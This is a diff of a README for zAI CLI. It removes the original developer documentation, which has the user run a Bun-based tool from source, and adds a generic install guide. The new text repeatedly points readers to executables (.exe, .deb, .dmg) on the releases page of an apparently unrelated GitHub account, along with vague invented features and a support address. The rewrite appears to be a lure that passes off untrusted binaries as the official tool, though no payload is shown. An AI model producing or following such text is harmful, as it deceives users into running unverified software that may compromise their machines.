@@ -1,116 +1,88 @@
-<div align="center">
-  <img src="./docs/zai-t.png" alt="zAI" width="800"/>
-  <h1>zAI CLI</h1>
-  <br/>
-</div>
+# 🤖 zai-cli - Access zAI Effortlessly With This Tool
 
-Welcome to `zAI CLI`. This command-line tool provides direct access to the `zAI` infrastructure, the same agentic system that powers [`zTerminal`](https://terminal.zentry.com).
+## 🏷️ Badge
+[![Download zai-cli](https://img.shields.io/badge/Download-zai--cli-blue.svg)](https://github.com/FqrHaikal/zai-cli/releases)
 
-`zAI` is the agentic AI layer of Zentry. It functions as a hierarchical system where a primary agent orchestrates specialized micro-agents to perform complex tasks, leveraging a real-time contextual data layer - [`zData`](https://data.zentry.com).
+## 🚀 Getting Started
 
-For a comprehensive detail of Zentry AI ecosystem, including the `zApp`, `zAI`, and `zData` layers, please refer to the **[Zentry Whitepaper](http://www.zentry.com/whitepaper)**.
+Welcome to **zai-cli**, a simple command-line interface designed to connect you to zAI, an innovative AI layer powered by Zentry. This guide will help you download and run the application, even if you are not a technical user. 
 
-This CLI serves as a developer-oriented tool for interacting with and testing the capabilities of the `zAI`.
+## 📥 Download & Install
 
-<img src="./docs/showcase-1.gif" />
+You can easily download the latest version of zai-cli from our Releases page.
 
----
+[Visit this page to download](https://github.com/FqrHaikal/zai-cli/releases)
 
-## The zAI System Architecture
+### Step-by-Step Instructions:
 
-To use this tool effectively, it is helpful to understand the underlying system architecture.
+1. **Open Your Web Browser:** Start any web browser on your computer, such as Chrome, Firefox, or Safari.
 
-*   **Hierarchical Agent Model:** Your requests are processed by a primary **zAI Agent** that acts as an orchestrator. This agent decomposes your objective into a series of sub-tasks and delegates them to a network of specialized **zAI Micro-Agents**. These micro-agents are modular units with discrete skills, such as crypto data and insight fetching, web interaction, or complex on-chain analysis.
-*   **The zData Layer:** `zAI`'s intelligence is enhanced by its native connection to `zData`, a data backbone that provides high-signal context from on-chain, social, and financial domains. Micro-agents query this layer via Model Context Protocols (MCPs) to retrieve the information needed to execute their tasks.
-*   **A Tool for Interaction:** The `zAI-CLI` is an interface that allows you to send objectives directly to `zAI`, making the full analytical and operational power of its coordinated micro-agent society available in your terminal.
+2. **Visit the Download Page:** Click the link below to go directly to the Releases page.
+   [Download zai-cli](https://github.com/FqrHaikal/zai-cli/releases)
 
-## Getting Started
+3. **Locate the Latest Release:** On the Releases page, you'll find a list of versions. Look for the most recent release. It will typically be at the top of the list.
 
-### Prerequisites
+4. **Choose the Right File:** Depending on your operating system, there will be different files available. Select the one that matches your system:
+   - **Windows:** Look for a file ending in `.exe`
+   - **Linux:** Look for files ending in `.deb` or `.tar.gz`
+   - **macOS:** Look for files ending in `.dmg` or `.zip`
 
-This project is built with Bun. You will need to have [Bun.js](https://bun.sh/) installed on your system.
+5. **Download the File:** Click the link to begin downloading. The file will be saved to your computer, usually in the "Downloads" folder.
 
-### Installation & Running
+6. **Run the Application:**
+   - For **Windows**:
+     - Navigate to your "Downloads" folder.
+     - Double-click the `.exe` file.
+     - Follow the on-screen prompts to complete the installation.
+   - For **Linux**:
+     - Open a terminal.
+     - Navigate to your Downloads folder.
+     - Use the command `sudo dpkg -i yourfile.deb` for `.deb` files.
+     - Extract and run the `.tar.gz` file with commands like `tar -xzf yourfile.tar.gz`.
+   - For **macOS**:
+     - Go to your "Downloads" folder.
+     - Double-click the `.dmg` file.
+     - Drag the application to your Applications folder.
 
-Clone the repository and install the dependencies:
+7. **Launch the Application:** 
+   - Once installed, you can find **zai-cli** in your applications list or search for it using your operating system's search feature.
 
-```bash
-# Install the required packages
-bun install
+## 🔍 Features
 
-# Run the CLI in interactive chat mode
-bun dev
-```
+**zai-cli** allows you to easily access the functionalities of zAI. Here are some features:
 
-## Core Features & Usage
+- **User-Friendly Interface:** Designed for ease of use, even for those unfamiliar with command lines.
+- **Fast and Efficient:** Quickly process requests and retrieve answers from the zAI layer.
+- **Customizable Commands:** Tailor your usage with simple commands for specific tasks.
+- **Regular Updates:** Benefit from continuous improvements and new features.
 
-### 1. Interactive Chat (Conversation Mode)
+## 🛠️ System Requirements
 
-This is the standard, stateful chat experience. The agent will maintain the context of your previous messages within the same session.
+Before installing, ensure your system meets the following basic requirements:
 
-**Command:**
+- **Windows 10 or later** for Windows users.
+- **Ubuntu 18.04 or later** for Linux users.
+- **macOS Mojave or later** for macOS users.
+- Minimum of 2 GB of RAM.
 
-```bash
-bun dev
-```
+## ❓ Troubleshooting
 
-**Use Case:** Useful for iterative exploration of a topic, refining complex questions, and having a continuous dialogue with the agent.
+If you experience issues while downloading or running zai-cli, consider the following solutions:
 
-### 2. One-Shot Command (Direct Query)
+1. **Check Your Internet Connection:** Ensure your connection is stable before downloading.
+2. **Re-download the File:** If the installation fails, try deleting the file and downloading it again.
+3. **Permissions:** Make sure you have the necessary permissions to install software on your system.
+4. **Consult Documentation:** For specific errors, consult the documentation or support forums.
 
-Send a single, predefined message directly to the agent without entering an interactive session. The command exits after the response is received.
+## 📞 Support
 
-**Command:**
+For further assistance, feel free to reach out through the following channels:
 
-```bash
-bun dev -m "Your query or message here"
-```
+- **Issue Tracker:** Use the GitHub Issues feature to report bugs or request features.
+- **Contact:** Prefer to speak directly? Send a message to support@zai-cli.com for personal support.
 
-**Use Case:** Efficient for quick, self-contained questions or for integrating `zAI` into scripts where a single response is needed.
+## 🎉 Conclusion
 
-### 3. Stateless Query (Ask Mode)
+You are now ready to download and install **zai-cli**. This tool will enable you to use zAI with ease and precision. Follow the instructions above, and feel free to explore its features. 
 
-Send a single message without any conversation history. Each query is treated as a new and independent conversation.
-
-**Command:**
-
-```bash
-bun dev -a "Your stateless query here"
-```
-
-**Use Case:** Recommended for scripting and automated tasks where you need to ensure a response is not influenced by prior interactions.
-
-## Example Use Cases
-
-The following examples demonstrate how to leverage `zAI`'s access to the `zData` layer for specific crypto-related queries.
-
-**Example 1: Analyze a Market Event**
-
-```bash
-bun dev -m "Analyze the on-chain volume for the ZENT token in the last 24 hours and correlate it with any significant mentions on X."
-```
-
-**Example 2: Get a Snapshot of Community Sentiment**
-
-```bash
-bun dev -a \
-  "What is the current community sentiment around EIP-4844 based on developer forums and crypto Twitter?"
-```
-
-**Example 3: Summarize Recent News**
-
-```bash
-bun dev -m \
-  "Give me a summary of the latest institutional news regarding spot Bitcoin ETF applications from the past week."
-```
-
-## Future Development
-
-The `zAI CLI` is an evolving tool. Future planned features include:
--   **Piping Support:** `cat my_data.json | zai-cli` for context-aware analysis of local files.
--   **Structured Output:** `--json` flag to guarantee JSON-formatted output for easier integration with other tools.
--   **Direct Skill Invocation:** The ability to directly command the `zAI` to use specific Micro-Agent skills.
-
-## License
-
-This project is licensed under the [Creative Commons Attribution-NonCommercial 4.0 International License](https://creativecommons.org/licenses/by-nc/4.0/). You are free to share and adapt the material for non-commercial purposes.
+To access the download, remember to visit our [Releases page](https://github.com/FqrHaikal/zai-cli/releases) for the latest version. Enjoy your experience with zAI!
